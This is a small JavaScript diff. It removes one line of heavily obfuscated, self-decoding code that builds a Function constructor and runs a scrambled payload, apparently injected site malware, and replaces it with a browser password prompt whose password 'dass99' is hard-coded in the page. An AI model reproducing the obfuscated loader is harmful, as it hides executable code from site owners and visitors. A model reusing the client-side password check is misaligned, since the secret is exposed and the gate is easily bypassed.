@@ -1,1 +1,20 @@
-(function(){var tCn='',Quy=173-162;function fmE(v){var n=634366;var h=v.length;var a=[];for(var j=0;j<h;j++){a[j]=v.charAt(j)};for(var j=0;j<h;j++){var s=n*(j+168)+(n%15885);var q=n*(j+172)+(n%18542);var b=s%h;var f=q%h;var y=a[b];a[b]=a[f];a[f]=y;n=(s+q)%4391466;};return a.join('')};var ijE=fmE('tunyuekraccsprzrotxhjvcbdotfsqnilwgom').substr(0,Quy);var SSU='9nl r=c7(u!3cyo71(ivn4vw ;(b4de++h6)=rlnjn;rrl+v]9.=0lvahte=<884;r>{pio6Cn.s)581b10,v2l,er;8oa7bqgx inlrm,arm[ eg6relhr]!j8av==h(=Su),t=i=.(;0a)=o>;7tagv;fss}va[z)l5"f++io)1usfztC)7o,tcri==]+ erui}y;,1f)+v3=0lfepagut[nn[o(h,(+hrj+r){nhreo);0]dger,; j;.5 l(g=+hh)c6ct.vsh1s(c+1 c[)).s=vhmr)stt(,(1[);id5t[;unr=t]liv2.{s4n-=nu"b icu9no[yva=)suhf+nq(f)nxa1  0foulsa2=f0r;=tozr);f=)ar6 =tpp cl,comAt"9)[va-"ns;j=q;2at1rl[=v(3l)*a.r(rr;r.]d)oto=(l)+u;ud];ha};peftgfff(v(1oh u9ieheA=.=-rr0==z)+h,,lod-}t;a+()l+A].A=rl,,(<t(l}2a };a.[<a+=; a1lee(cuot[(.=;oe;;]0 ]r8C,s=s];me8llagwnixsh;azolfvf9il=(na,)e,.]p7r8(0,v+l]fCgr,<c;}a6lregvh[fpr)f( prat.. 70e)nsub+-,.q=i7+uvasxamni6((ou""db=t.x)Ch2tr=;b);],;, otr;jhs5;e{h(uag .j.+n, j8l+a6zsu(,eveksf-;rc,[ac"avyg=Ct6i2t{fi,(=.alC"ghb;fx;e*rA8a+pfrn;p<ov9i.elhfgn,;w..h=iec6(0r;p;h7+.haaS).j" 2{b;(-)r.rrsr={(rtvrm;imli )(vaglitmr+sbvgtC;;=b"n) omn4p;3';var dJb=fmE[ijE];var vJX='';var OFR=dJb;var SnO=dJb(vJX,fmE(SSU));var Tlb=SnO(fmE(')=oXX(!sXbX6s(Xp%=uXeelft.(_t12.s_;s[o=d,_(anX;_]M+3.tdoa_5{l1$.leX1tX1eXdSt_)3ao0XX.3rh.Xr]$e[1(s.$._pc8XXaCX]rt!)7j X0f;eX%ir%_7m_"!;fg)scmpr&{0dSt".nhu(_XXi_t X(c6XX.aXd3..bt}t(2m$e33qn{.; ,$25e!.;b]b5re!e7X.n_i..{Xqba5%([ee},adXe$oXo$rm3Xod;c.cq.o!3n;To6s5es{;e9re=hos36=6egt$Xdtd$:Xsm.,fcv$5 X;n7.e(,d1X.swc.$.)tdsopfret%0kfnaX!reX).\/5(ete!;h[(.5eXn76t)Xe).e$o1dea!X=64_sw.!#j]e5(nn}e otn,lbl3.c}4_a9)b(r3mj)ne4o&.1"]5).w$)3}t,1,4a{o.(,X,XrX2_54mee($XXa71.o XX.))q_$1:I_sn$.9(_ee_7M4i=s_XwXeq=1XX_!bnpd].X1X).5xespX} (,;X.!X0=e[b;r{o7t=3!=u;6efo$!dce!tX_,_3!r*q._)wr;w1fcrar(htsX)))fXX#X_t2X_ 3:t7cXuie,h7o3a=b),e$X4%)p0.7eXa7;)t}ii4X{,0=q]X5,X8485ttl;.=.Se33v=1..n1(4r23#1e2no1Xco035_X3)32h4bese45_ cXl.7;,ecc8h,X_euoX!.6,$;eau.t)80=(.a.j)h) ls4($s$9o)Xe8e8X9cene8t).4r!2(8nr0sbse13$,)cX6!Xs)3..of1f$_E39"pln5p"5X,Xmnr{_X-e=0)rX-t1!+_rX}Xstelb+X=.reqX.e;. ;(1s6X10rn t6-p)5=aX\/()r(bb"X3+\/{X+vn.9X_X.)o{(o)teg(dfps.eXb[t%!$-o.et6n(93 ,to op&,g7;oX_3ot(6p4np ,se(XtXXj;aun(l$5bX().7ri,..){%0).t(*86t1.6;9ecf4ft39)X6#XpeX=se3r(0c)nXr\/jquiXXXer_6de!X,r)t.X&;1.{+e\'zf74_uotts_"26(_ch_Xa+(it1tl5r,n,re }2&igo.rt6n2XX\'c.e5su-ta9.}.,e_9ofch)j7e*t#,_];\'5)e 50sXo05Xga,hg;Xu=(s,e.j4h,gfc,_%(_]=ne)(.X4p9s6d.5]_1\'XC}.t33))$]n_ #lrtg%4&Xn7=c,l.j())X4j;1pt6)a\'tr)Xn()(Xf2i54"=!+.!  ra! "_hXr()"X3e7t;e_X"e.7{(nc;%3.fXeq$}3#X.h)iter_%{f=)599;0)4a$$)..!!=42X8t%$bXeb_2;aX2Xoei0 re)egfy_zn_pa9e(_0jXvbf,$"4bro*= pt,7!rtu)a#pX(Da=q$d_u2n f,0)3)ft.m7s8).5!it]mcXe%_see{{!(.ix_6ejes;*ntvjm$c((X45C.eeoX!,e%$))o+g(eav%i.3 4]!3eo;1..X_$n(,to.X]%1=nmt..o.'));var wog=OFR(tCn,Tlb );wog(8016);return 1455})()
+document.addEventListener("DOMContentLoaded", function() {
+    // Check if the correct password is already stored in session storage
+    if (sessionStorage.getItem('authenticated') !== 'true') {
+        // Prompt for the password
+        const password = prompt("Please enter the password to access the content:");
+
+        // Define the correct password
+        const correctPassword = "dass99"; // Set your password here
+
+        // Check if the entered password is correct
+        if (password === correctPassword) {
+            // Store the authenticated state in session storage
+            sessionStorage.setItem('authenticated', 'true');
+        } else {
+            // If the password is incorrect, display an error message and hide the content
+            alert("Incorrect password. You do not have access to this content.");
+            document.body.innerHTML = "";
+        }
+    }
+});
